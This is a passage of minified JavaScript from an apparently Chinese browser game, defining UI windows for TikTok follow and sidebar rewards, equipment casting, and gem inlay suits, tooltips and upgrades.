__extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this.btnReward,this.onClick),this.baseRewardList.itemRenderer=o.ItemBase,this.baseRewardList.dataProvider=this.sData=new eui.ArrayCollection,observe(this,this.updateData,a.TikTokCT.ins().updateTikTokAllAwardState),this.addChangeEvent(this.eTab,this.onTabTouch),this.eTab.selectedIndex=0,this.updateData()},e.prototype.close=function(){win.close(this)},e.prototype.onTabTouch=function(){this.oldIndex!=this.eTab.selectedIndex&&(this.eTab.selectedIndex=this.eTab.selectedIndex,this.updateData())},e.prototype.updateData=function(){var t=s.GlobalConfig.XiaoChengXuReward;if(t){var e=a.TikTokCT.ins().returnInfoDataByType(this.eTab.selectedIndex+1),i=s.GlobalConfig.XiaoChengXuCommonReward[this.eTab.selectedIndex+1];if(i&&(this.sData.source=i.awards),e){switch(this.eTab.selectedIndex){case l.Cebianlan:1==urlParam.isTikTokSidebar&&1==urlParam.isTikTokAward&&0==e.isAward?(this.btnReward.label=gettext("领取奖励"),this.btnReward.enabled=!0):1==urlParam.isTikTokSidebar&&0==urlParam.isTikTokAward&&0==e.isAward&&(this.btnReward.label=gettext("进入侧边栏"),this.btnReward.enabled=!0),(void 0!=(null===t||void 0===t?void 0:t.imgIcon)||(null===t||void 0===t?void 0:t.imgIcon))&&(this.icon_entryIcon.source=t.imgIcon),this.tyypeSet.text=t.sideTest1,this.des.text=t.sideTest2;break;case l.Guanzhu:2==urlParam.isTikTokConcern&&0==e.isAward?(this.btnReward.label=gettext("领取奖励"),this.btnReward.enabled=!0):1==urlParam.isTikTokConcern&&0==e.isAward&&(this.btnReward.label=gettext("打开关注"),this.btnReward.enabled=!0),(void 0!=(null===t||void 0===t?void 0:t.followImg)||(null===t||void 0===t?void 0:t.followImg))&&(this.icon_entryIcon.source=t.followImg),this.tyypeSet.text=t.followTest1,this.des.text=t.followTest2;break;case l.Shoucang:2==urlParam.TikTokCollection&&0==e.isAward?(this.btnReward.label=gettext("领取奖励"),this.btnReward.enabled=!0):this.btnReward.enabled=!1,(void 0!=(null===t||void 0===t?void 0:t.collectImg)||(null===t||void 0===t?void 0:t.collectImg))&&(this.icon_entryIcon.source=t.collectImg),this.tyypeSet.text=t.collectTest1,this.des.text=t.collectTest2;break;case l.Tianjia:2==urlParam.TikTokAddTo&&0==e.isAward?(this.btnReward.label=gettext("领取奖励"),this.btnReward.enabled=!0):this.btnReward.enabled=!1,(void 0!=(null===t||void 0===t?void 0:t.deskImg)||(null===t||void 0===t?void 0:t.deskImg))&&(this.icon_entryIcon.source=t.deskImg),this.tyypeSet.text=t.deskTest1,this.des.text=t.deskTest2}this.baseRewardList.validateNow(),1==e.isAward&&(this.btnReward.label=gettext("已领取奖励"),this.btnReward.enabled=!1)}else this.btnReward.enabled=!1}else this.btnReward.enabled=!1},e.prototype.onClick=function(){var t=a.TikTokCT.ins().returnInfoDataByType(this.eTab.selectedIndex+1);if(0==t.isAward)switch(this.eTab.selectedIndex){case l.Cebianlan:1==urlParam.isTikTokSidebar&&1==urlParam.isTikTokAward?a.TikTokCT.ins().getTikTokAwardById(this.eTab.selectedIndex+1):(platform.getTikTokSidebar(),this.close());break;case l.Guanzhu:2==urlParam.isTikTokConcern?a.TikTokCT.ins().getTikTokAwardById(this.eTab.selectedIndex+1):(platform.setTikTokGameForConcern(),this.close());break;case l.Shoucang:2==urlParam.TikTokCollection&&a.TikTokCT.ins().getTikTokAwardById(this.eTab.selectedIndex+1);break;case l.Tianjia:2==urlParam.TikTokAddTo&&a.TikTokCT.ins().getTikTokAwardById(this.eTab.selectedIndex+1)}},e}(n.BaseView);e.DyGameAwardWin=r,window.DyGameAwardWin=r,__reflect(r.prototype,"DyGameAwardWin",[]),window.DyGameAwardWin=r;var l;!function(t){t[t.Cebianlan=0]="Cebianlan",t[t.Guanzhu=1]="Guanzhu",t[t.Shoucang=2]="Shoucang",t[t.Tianjia=3]="Tianjia"}(l=e.TikTokAwardType||(e.TikTokAwardType={})),window.TikTokAwardType=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DyGameConcernRule=void 0;var n=i(20),o=i(41),s=i(116),a=i(380),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.TikTokCT.ins().updateTikTokConcernState]),i}return __extends(e,t),e.prototype.checkShow=function(){return!1},e.prototype.tapEvt=function(){n.GameMap.checkIsKf()||win.open(a.DyGameConcernWin)},e}(o.PayfunIconData);e.DyGameConcernRule=r,window.DyGameConcernRule=r,__reflect(r.prototype,"DyGameConcernRule",[]),window.DyGameConcernRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DyGameRule=void 0;var n=i(15),o=i(20),s=i(41),a=i(12),r=i(116),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([r.TikTokCT.ins().updateTikTokAllAwardState]),i}return __extends(e,t),e.prototype.checkShow=function(){return a.OpenSystem.ins().checkSysOpen(n.SystemType.DYPACKEGE)&&(1==urlParam.isTikTokConcern||2==urlParam.isTikTokConcern||1==(null===urlParam||void 0===urlParam?void 0:urlParam.isTikTokSidebar)||2==(null===urlParam||void 0===urlParam?void 0:urlParam.TikTokCollection)||2==(null===urlParam||void 0===urlParam?void 0:urlParam.TikTokAddTo))&&r.TikTokCT.ins().returnIsShow()},e.prototype.tapEvt=function(){o.GameMap.checkIsKf()||win.open("DyGameAwardWin")},e}(s.PayfunIconData);e.DyGameRule=l,window.DyGameRule=l,__reflect(l.prototype,"DyGameRule",[]),window.DyGameRule=l},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingMainWin=void 0;var n=i(42),o=i(5),s=i(1),a=i(11),r=i(0),l=i(57),h=i(39),u=i(4),p=i(48),d=i(6),c=i(31),f=i(10),g=i(189),m=i(358),v=i(38),y=i(2),C=i(26),T=i(153),b=i(859),w=i(860),I=i(861),_=i(381),S=function(t){function e(){var e=t.call(this)||this;return e._sn_="CastingMainWinSkin",e._blessValueMax=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listItem0.itemRenderer=b.CastingEquipItem,this.listItem0.dataProvider=this._equipCastingArr=new eui.ArrayCollection,this.listProduct.itemRenderer=a.ItemBase,this.listProduct.dataProvider=this._equipProductArr=new eui.ArrayCollection,this.listCost.itemRenderer=I.CastingItem1,this.listCost.dataProvider=this._costArr=new eui.ArrayCollection;new w.CastingItem,new I.CastingItem1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];T.CastingData.ins.selCastingEquip=null,this._blessValueMax=r.GlobalConfig.EquipAffixBaseConfig.castingBless,this.progressBar.maximum=this._blessValueMax,this.progressBar.value=0,this.listItem0.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.castItemOntap,this),this.itemCost0.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHander,this),this.itemCost1.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHander,this),this.btnForging.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHander,this),this.help.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHander,this),this.observe(T.CastingData.ins.postSelMaterialEquipChange,this.flusMaterialEquipChange),this.observe(T.CastingData.ins.postCastInfoChange,this.flusCanCastingEquipInfo),this.observe(v.EquipCT.ins().postEquipChange2,this.flusSelEquipWareStatus),this.observe(v.EquipCT.ins().postBagItemAdd,this.flusSelEquipWareStatus1),this.observe(d.BagCT.ins().postItemDel,this.flusMaterialEquipChange1),this.flusCanCastingEquipInfo()},e.prototype.flusMaterialEquipChange=function(t){this._selItemCost.data=t,this.flusSuccessRate()},e.prototype.flusMaterialEquipChange1=function(){if(T.CastingData.ins.selCastingMaterialEquip){var t=f.ItemUtil.getType(T.CastingData.ins.selCastingMaterialEquip.itemConfig);if(t==h.ItemType.TYPE_0){var e=d.BagCT.ins().getBagGoodsByHandle(t,T.CastingData.ins.selCastingMaterialEquip.handle);
e||(this.itemCost1.data=null)}}},e.prototype.flusSuccessRate=function(){var t=0;this.item0.data&&(t+=T.CastingData.ins.getSuccRate(2,this.item0.data)),this.itemCost0.data&&(t+=T.CastingData.ins.getSuccRate(1,this.itemCost0.data)),this.itemCost1.data&&(t+=T.CastingData.ins.getSuccRate(2,this.itemCost1.data)),this.txtRate.text=Math.floor(t/1e4*100)+"%"},e.prototype.onClickHander=function(t){var e;switch(t.currentTarget){case this.itemCost0:this._selItemCost=t.currentTarget,win.open(_.CastingSelEquipWin,1);break;case this.itemCost1:this._selItemCost=t.currentTarget,win.open(_.CastingSelEquipWin,2);break;case this.btnForging:this.toCasting();break;case this.help:win.open("CommonHelpWin",(null===(e=r.GlobalConfig.HelpInfoConfig[311])||void 0===e?void 0:e.text)||"")}},e.prototype.toCasting=function(){var t,e;if(T.CastingData.ins.selCastingEquip){var i=r.GlobalConfig.EquipCastingConfig[null===(t=T.CastingData.ins.selCastingEquip)||void 0===t?void 0:t.star];if(i){var n=r.GlobalConfig.ItemConfig[null===(e=T.CastingData.ins.selCastingEquip)||void 0===e?void 0:e.configID],o=f.ItemUtil.getSubType(n);if(!d.BagCT.ins().isConsumeEnough(i.castingItems[o],d.BagCT.BAG_TYPE_OTHTER,!1))return void y.TipsCT.ins().showTips(gettext("基础材料不足"));if(!this.itemCost0.data)return void y.TipsCT.ins().showTips(gettext("未添加图纸材料"));if(!this.itemCost1.data)return void y.TipsCT.ins().showTips(gettext("未添加远古装备材料"));var s=u.ActorCC.level,a=C.ZsCT.ins().stage,l=r.GlobalConfig.EquipConfig[T.CastingData.ins.selCastingEquip.configID];if(l&&l.equips&&l.equips.length>0)for(var h=0,p=l.equips.length;p>h;h++){var c=r.GlobalConfig.ItemConfig[l.equips[h]],v=c.level,b=c.zsLevel?c.zsLevel:0;if(v>s||b>a){var w=b>0?gettext("{0}转{1}级后可锻铸该装备",b,v):gettext("{0}级后可锻铸该装备",v);return void y.TipsCT.ins().showTips(w)}}for(var I=[this.itemCost1.data],_=[],S=0;S<I.length;S++){var x=I[S];d.BagCT.ins().isNotRecycleXiLianEquip()&&x.isXiLian()||_.push(x)}var D=d.BagCT.ins().getShowList(_);if(D&&D.length>0){var A=new g.BagCallBackConfirmData(this,this.callBackFunc,_,D,1,gettext("是否继续锻铸？"),gettext("锻铸确认"));win.open(m.BagCallBackConfirmWin,A)}else this.toCasting1()}}},e.prototype.toCasting1=function(){var t=0,e=T.CastingData.ins.selCastingEquip.handle,i=this.itemCost0.data.configID,n=this.itemCost1.data.handle;T.CastingData.ins.isWeared=T.CastingData.ins.selCastingEquip.isWeared,v.EquipCT.ins().sendEquipCasting(t,e,n,i)},e.prototype.callBackFunc=function(t,e){t==l.BagCBConfirmResult.Confirm&&e.items&&this.toCasting1()},e.prototype.castItemOntap=function(t){var e=this.listItem0.selectedItem;T.CastingData.ins.selCastingEquip&&T.CastingData.ins.selCastingEquip.handle==e.handle||(T.CastingData.ins.selCastingEquip=this.listItem0.selectedItem,this.flusCanCastingEquipInfo())},e.prototype.flusCanCastingEquipInfo=function(){this.itemCost0.txtDesc.text=gettext("选择加入图纸"),this.itemCost1.txtDesc.textFlow=HtmlUtil.parse(gettext("选择{0}",n.StringUtils.addColor(gettext("远古装备"),16711680)));var t=T.CastingData.ins.getCanCastingEquipArr();return this.progressBar.maximum=this._blessValueMax,this.progressBar.value=T.CastingData.ins.blessValue,t&&0!=t.length?(T.CastingData.ins.selCastingEquip=T.CastingData.ins.selCastingEquip?T.CastingData.ins.selCastingEquip:t&&t.length>0?t[0]:null,this._equipCastingArr.replaceAll(t),this.itemCost0.data=null,this.itemCost1.data=null,this.flusCostInfo(),this.flusSelEquipInfo(),void this.flusFinishedProduct()):(this.txtRate.text="0%",this.type.text="",this.lv.text="",this.job.text="",this.ql.text="",this._equipCastingArr.replaceAll([]),this._equipProductArr.replaceAll([]),this._costArr.replaceAll([]),this.itemCost0.data=null,this.itemCost1.data=null,this.item0.data=null,void this.item0.clearIcon())},e.prototype.flusSelEquipWareStatus=function(t){T.CastingData.ins.selCastingEquip.handle==t&&(T.CastingData.ins.selCastingEquip.isWeared=!0)},e.prototype.flusSelEquipWareStatus1=function(t){T.CastingData.ins.selCastingEquip.handle==t&&(T.CastingData.ins.selCastingEquip.isWeared=!1)},e.prototype.flusSelEquipInfo=function(){this.item0.data=T.CastingData.ins.selCastingEquip,this.flusSuccessRate();var t=c.QUALITY_NAME[T.CastingData.ins.selCastingEquip.quality],e=f.ItemUtil.getQualityColor(T.CastingData.ins.selCastingEquip.quality);this.ql.textFlow=o.TextFlowMaker.generateTextFlow(gettext("品质:|C:{0}&T:{1}|",e,t));var i=r.GlobalConfig.ItemConfig[T.CastingData.ins.selCastingEquip.configID],n=f.ItemUtil.getSubType(i),s=p.Role.getEquipNameByType(n);this.type.textFlow=o.TextFlowMaker.generateTextFlow(gettext("类型:|C:0xFFFFFF&T:{0}|",s));var a=f.ItemUtil.getJob(i);this.job.textFlow=o.TextFlowMaker.generateTextFlow(gettext("职业:|C:0xFFFFFF&T:{0}|",p.Role.getJobNameByJob(a))),this.lv.textFlow=o.TextFlowMaker.generateTextFlow(gettext("等级:|C:0x00FF00&T:{0}{1}级|",i.zsLevel>0?i.zsLevel+gettext("转"):"",i.level||1))},e.prototype.flusCostInfo=function(){var t,e,i=r.GlobalConfig.EquipCastingConfig[null===(t=T.CastingData.ins.selCastingEquip)||void 0===t?void 0:t.star];if(i){var n=r.GlobalConfig.ItemConfig[null===(e=T.CastingData.ins.selCastingEquip)||void 0===e?void 0:e.configID],o=f.ItemUtil.getSubType(n);this._costArr.source=i.castingItems[o],this._costArr.refresh()}else this._costArr.replaceAll([])},e.prototype.flusFinishedProduct=function(){var t,e=r.GlobalConfig.EquipConfig[null===(t=T.CastingData.ins.selCastingEquip)||void 0===t?void 0:t.configID],i=[];if(e&&e.equips&&e.equips.length>0)for(var n=0,o=e.equips.length;o>n;n++){var s=T.CastingData.ins.selCastingEquip.deepClone();s.handle=void 0,s.configID=e.equips[n],s.isPreview=!0,s.itemConfig=r.GlobalConfig.ItemConfig[e.equips[n]],s.star<3&&s.star++,s.quality<6&&s.quality++,i.push(s)}this._equipProductArr.replaceAll(i)},__decorate([delayCall(100)],e.prototype,"flusCanCastingEquipInfo",null),e}(s.BaseView);e.CastingMainWin=S,window.CastingMainWin=S,__reflect(S.prototype,"CastingMainWin",[]),window.CastingMainWin=S},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingEquipItem=void 0;var n=i(156),o=i(153),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var e;t.prototype.dataChanged.call(this);var i=this.data;this.setSel(i.handle==(null===(e=o.CastingData.ins.selCastingEquip)||void 0===e?void 0:e.handle)),this.lbBestNum.visible=!1},e.prototype.setSel=function(t){this.imgSelect.visible=t},e}(n.TabClearItemRender);e.CastingEquipItem=s,window.CastingEquipItem=s,__reflect(s.prototype,"CastingEquipItem",[]),window.CastingEquipItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="CastingItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.item.touchEnabled=!1,this.item.touchChildren=!1},e.prototype.dataChanged=function(){var t;this.item.data=this.data,!this.data&&(null===(t=this.item.getItemIcon())||void 0===t?void 0:t.setIcon("")),this.item.showNum(!1),this.imgAdd.visible=this.data?!1:!0},e}(n.BaseItemRender);e.CastingItem=o,window.CastingItem=o,__reflect(o.prototype,"CastingItem",[]),window.CastingItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingItem1=void 0;var n=i(3),o=i(6),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="CastingItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.item.touchEnabled=!1,this.item.touchChildren=!1},e.prototype.dataChanged=function(){this.item.data=this.data,this.item.showNum(!1),this.imgAdd.visible=!1;var t=this.data,e=t.id,i=t.count,n=o.BagCT.ins().getBagItemCount(o.BagCT.BAG_TYPE_OTHTER,e),s=i;this.txtDesc.textColor=n>=s?841064:16711680,this.txtDesc.text=n+"/"+s},e}(n.BaseItemRender);e.CastingItem1=s,window.CastingItem1=s,__reflect(s.prototype,"CastingItem1",[]),window.CastingItem1=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingEquipMaterialItem=void 0;var n=i(156),o=i(153),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var e;t.prototype.dataChanged.call(this);var i=this.data;this.setSel(i.handle==(null===(e=o.CastingData.ins.selCastingMaterialEquip)||void 0===e?void 0:e.handle)),this.lbBestNum.visible=!1},e.prototype.setSel=function(t){this.imgSelect.visible=t,this.item.touchEnabled=t,this.item.touchChildren=t},e}(n.TabClearItemRender);e.CastingEquipMaterialItem=s,window.CastingEquipMaterialItem=s,__reflect(s.prototype,"CastingEquipMaterialItem",[]),window.CastingEquipMaterialItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySuitWin=void 0;var n=i(1),o=i(0),s=i(104),a=i(864),r=i(865),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SuitSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=r.EquipInlaySuitItem,this.list.dataProvider=this.listArr=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.initList,s.EquipInlayCT.ins().viewShowSkill),this.initList()},e.prototype.initList=function(t){void 0===t&&(t=-1);for(var e=[],i=Object.keys(o.GlobalConfig.GemSuitConfig),n=0;n<i.length;n++){var s=i[n],r=new a.EquipInlaySuitItemData(+s,n==t);e.push(r)}this.listArr.replaceAll(e)},e}(n.BaseView);e.EquipInlaySuitWin=l,window.EquipInlaySuitWin=l,__reflect(l.prototype,"EquipInlaySuitWin",[]),window.EquipInlaySuitWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySuitItemData=void 0;var n=function(){function t(t,e){this.isShow=!1,this.id=t,this.isShow=e}return t}();e.EquipInlaySuitItemData=n,window.EquipInlaySuitItemData=n,__reflect(n.prototype,"EquipInlaySuitItemData",[]),window.EquipInlaySuitItemData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySuitItem=void 0;var n=i(5),o=i(3),s=i(48),a=i(104),r=i(866),l=i(867),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SuitItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.skillList.itemRenderer=l.EquipInlaySuitSkillItem,this.skillList.dataProvider=this.skillListArr=new eui.ArrayCollection,this.show.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.dataChanged=function(){this.id=this.data.id;var t=this.suitData.suitLv;this.lbSkillLv.text="Lv."+(0==t?1:t),this.currentState=this.data.isShow?"show":"hide",this.lbSuitName.text=s.Role.getEquipNameByType(this.id)+gettext("套装"),this.lbActTag.visible=!this.suitData.isActed,this.lbProgress.text=gettext("已镶嵌：{0}/3",a.EquipInlayCT.ins().getGemDatas(this.id).length||0),this.lbSkillName.text=this.suitData.suitName||gettext("没有套装"),this.lbSkillDes.textFlow=n.TextFlowMaker.generateTextFlow(this.suitData.suitDes),this.icon.source=this.suitData.suitIcon,this.updateList()},e.prototype.updateList=function(){var t=[],e=this.suitData;if(e){var i=new r.EquipInlaySuitSkillData(this.id,0,0);t.push(i);for(var n=e.getSuitIds(),o=0;o<n.length;o++){var s=n[o],a=o+1,l=new r.EquipInlaySuitSkillData(this.id,s,a);t.push(l)}this.skillListArr.source=t}},e.prototype.onClick=function(t){switch(t.target){case this.show:this.data.isShow?a.EquipInlayCT.ins().viewShowSkill(-1):a.EquipInlayCT.ins().viewShowSkill(this.itemIndex)}},Object.defineProperty(e.prototype,"suitData",{get:function(){return a.EquipInlayCT.ins().getSuitDataById(this.id)},enumerable:!1,configurable:!0}),e}(o.BaseItemRender);e.EquipInlaySuitItem=h,window.EquipInlaySuitItem=h,__reflect(h.prototype,"EquipInlaySuitItem",[]),window.EquipInlaySuitItem=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySuitSkillData=void 0;var n=i(0),o=i(104),s=function(){function t(t,e,i){void 0===e&&(e=0),this.id=t,this.suitId=e,this.suitLv=i}return Object.defineProperty(t.prototype,"skillDes",{get:function(){return 0==this.suitId?"":n.GlobalConfig.GemReviseConfig[this.suitId].desc||""},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"isAct",{get:function(){var t=o.EquipInlayCT.ins().getSuitDataById(this.id);return t?t.suitLv==this.suitLv:!1},enumerable:!1,configurable:!0}),t}();e.EquipInlaySuitSkillData=s,window.EquipInlaySuitSkillData=s,__reflect(s.prototype,"EquipInlaySuitSkillData",[]),window.EquipInlaySuitSkillData=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlaySuitSkillItem=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="SuitSkillItemSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;t&&(this.groupLv.visible=0!=t.suitLv,this.lbAct.visible=0==t.suitLv,this.skillLv.text=t.suitLv+"",this.skillDes.textFlow=n.TextFlowMaker.generateTextFlow1(0==t.suitLv?gettext("无效果"):t.skillDes),this.selectImg.visible=t.isAct)},e}(o.BaseItemRender);e.EquipInlaySuitSkillItem=s,window.EquipInlaySuitSkillItem=s,__reflect(s.prototype,"EquipInlaySuitSkillItem",[]),window.EquipInlaySuitSkillItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayTipsWin=void 0;var n=i(16),o=i(5),s=i(1),a=i(0),r=i(57),l=i(4),h=i(48),u=i(6),p=i(31),d=i(10),c=i(62),f=i(382),g=i(2),m=i(27),v=i(104),y=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GemTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnSeparate,this.onClick),this.addTouchEvent(this.btnUpgrade,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(this.itemData=t[0],this.itemData&&(this.itemConfig=this.itemData.itemConfig,this.itemConfig)){this.itemIcon.data=this.itemData;var i=this.itemData.getGemLv();this.itemIcon.setData(this.itemConfig,this.itemData);var s=d.ItemUtil.getSubType(this.itemConfig),u=(this.itemData.getGemBody()||[],h.Role.getEquipNameByType(s));if(this.lbEquipName.text=u,this.lbQuality.text=p.QUALITY_NAME[i],this.lbQuality.textColor=p.QUALITY_COLOR[i||0],a.GlobalConfig.GemSuitConfig[s]){this.lbSubDes.text=u+gettext("镶嵌3个{0}符印激活",a.GlobalConfig.GemUpdateConfig[i].lvName);var c=[a.GlobalConfig.GemSuitConfig[s].skillSuit_1,a.GlobalConfig.GemSuitConfig[s].skillSuit_2,a.GlobalConfig.GemSuitConfig[s].skillSuit_3,a.GlobalConfig.GemSuitConfig[s].skillSuit_4,a.GlobalConfig.GemSuitConfig[s].skillSuit_5],g=[a.GlobalConfig.GemSuitConfig[s].suit_1,a.GlobalConfig.GemSuitConfig[s].suit_2,a.GlobalConfig.GemSuitConfig[s].suit_3,a.GlobalConfig.GemSuitConfig[s].suit_4,a.GlobalConfig.GemSuitConfig[s].suit_5],m=l.ActorCC.jobId-1;this.lbSkillDes0.text=c[m]+" lv"+i,this.lbSkillDes1.textFlow=o.TextFlowMaker.generateTextFlow(a.GlobalConfig.GemReviseConfig[g[m][i-1]].desc);var y=this.itemData.getPrefixId(),C=a.GlobalConfig.GemPrefixConfig[y];this.skillIcon1.source=C.icon}else n.DisplayUtils.removeFromParent(this.suitGroup);var T=f.StoreHouseCT.ins().getItemsByType(r.STORE_SUB_TYPE.All)||[],b=T.indexOf(this.itemData);b>-1&&n.DisplayUtils.removeFromParent(this.btnGroup),this.itemData.handle||(n.DisplayUtils.removeFromParent(this.btnGroup),n.DisplayUtils.removeFromParent(this.btnSeparate)),this.nameLabel.textColor=p.QUALITY_COLOR[i||0],this.nameLabel.text=a.GlobalConfig.GemUpdateConfig[i].lvName+""+this.itemData.getGemName(),this.btnUpgrade.visible=this.itemData.handle>0,this.btnUpgrade.visible=this.itemData.handle>0;var w="",I=this.itemData.getPrefixId();if(I){var _=a.GlobalConfig.GemPrefixConfig[I].body,S=v.EquipInlayCT.ins().getSuitDataById(_);void 0!=S.suitName&&(w=S.suitName)}var x=this.itemData.getGemSkillDes();this.lbDes.textColor=p.QUALITY_COLOR[i||0],this.lbDes.textFlow=o.TextFlowMaker.generateTextFlow1(w+x);var D=a.GlobalConfig.GemUpdateConfig[i].resolve[0];this.lbDes0.text=gettext("获得 ")+a.GlobalConfig.ItemConfig[D.id].name+"x"+D.count}},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnSeparate:var e=d.ItemUtil.getSubType(this.itemConfig),i=v.EquipInlayCT.ins().getPosGemDatas(e)||[];e==c.EquipPos.Wrist&&(i=i.concat(v.EquipInlayCT.ins().getPosGemDatas(c.EquipPos.DZI))),e==c.EquipPos.RING&&(i=i.concat(v.EquipInlayCT.ins().getPosGemDatas(c.EquipPos.HAT)));for(var n=0;n<i.length;n++)if(i[n].itemData==this.itemData)return void g.TipsCT.ins().showTips(gettext("已镶嵌无法分解"));m.WarnWin.show(gettext("确认分解该符印，")+this.lbDes0.text,this.onSeparate,this);break;case this.btnUpgrade:win.open("EquipInlayUpgradeWin",this.itemData),win.close(this)}},e.prototype.onSeparate=function(){u.BagCT.ins().sendCbequip(4,[this.itemData]),win.close(this)},e}(s.BaseView);e.EquipInlayTipsWin=y,window.EquipInlayTipsWin=y,__reflect(y.prototype,"EquipInlayTipsWin",[]),window.EquipInlayTipsWin=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayUpgradeWin=void 0;var n=i(19),o=i(5),s=i(1),a=i(0),r=i(6),l=i(31),h=i(62),u=i(2),p=i(104),d=i(870),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GemUpgradeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnUpgrade,this.onClick),this.addTouchEvent(this.closeBtn,this.onClick),this.list.itemRenderer=d.EquipInlayConsumeSkillItem,this.list.dataProvider=this.listArr=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.itemData=t[0],observe(this,this.onUpgrade,p.EquipInlayCT.ins().patchUpgrade),this.updateView()},e.prototype.onUpgrade=function(){var t=r.BagCT.ins().getBagGoodsByHandle(r.BagCT.BAG_TYPE_OTHTER,this.itemData.handle);if(!t){var e=this.itemData.getPrefixId();if(e){var i=a.GlobalConfig.GemPrefixConfig[e].body,n=p.EquipInlayCT.ins().getGemDatas(i);i!=h.EquipPos.RING||this.getGemDatas(n)||(n=p.EquipInlayCT.ins().getGemDatas(h.EquipPos.HAT)),i!=h.EquipPos.Wrist||this.getGemDatas(n)||(n=p.EquipInlayCT.ins().getGemDatas(h.EquipPos.DZI));for(var o=0;o<n.length;o++)n[o].itemData.handle==this.itemData.handle&&(t=n[o].itemData)}}this.itemData=t,this.updateView()},e.prototype.getGemDatas=function(t){for(var e,i=0;i<t.length;i++)t[i].itemData.handle==this.itemData.handle&&(e=t[i].itemData);return e},e.prototype.updateView=function(){var t,e,i=this.itemData;if(i){this.currentState=this.isMax(i)?"max":"upgrade";var n=this.getNextItemData(i);this.curTarget.data=i,this.nextTarget.data=n,this.curTarget.touchEnabled=!1,this.curTarget.touchChildren=!1,this.nextTarget.touchEnabled=!1,this.nextTarget.touchChildren=!1;var s=i.getGemSkillId(),r=n.getGemSkillId(),h="",u=this.itemData.getPrefixId();if(u){var d=a.GlobalConfig.GemPrefixConfig[u].body,c=p.EquipInlayCT.ins().getSuitDataById(d);void 0!=c.suitName&&(h=c.suitName)}s&&(this.curSkillDes.textColor=l.QUALITY_COLOR[this.itemData.getGemLv()||0],this.curSkillDes.textFlow=o.TextFlowMaker.generateTextFlow(h+(null===(t=a.GlobalConfig.GemReviseConfig[s])||void 0===t?void 0:t.desc))),r&&(this.nextSkillDes.textColor=l.QUALITY_COLOR[this.itemData.getGemLv()+1],this.nextSkillDes.textFlow=o.TextFlowMaker.generateTextFlow(h+(null===(e=a.GlobalConfig.GemReviseConfig[r])||void 0===e?void 0:e.desc))),this.listArr.source=this.getCost()}},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnUpgrade:if(!n.GlobalFun.isConsumeEnough(this.getCost()))return void u.TipsCT.ins().showTips(gettext("道具不足"));p.EquipInlayCT.ins().sendUpgrade(this.itemData.handle);break;case this.closeBtn:win.close(this)}},e.prototype.getNextItemData=function(t){if(t){var e=t.copy(),i=e.getGemLv(),n=e.getGemSkills()||[],o=i+1;return o=Math.min(n.length,o),e.setGemLv(o),e}},e.prototype.isMax=function(t){var e=t.getGemLv(),i=t.getGemSkills();return e>=i.length},e.prototype.getCost=function(){var t=this.itemData.getGemLv()||1,e=Object.keys(a.GlobalConfig.GemUpdateConfig).length;t=Math.min(t,e);var 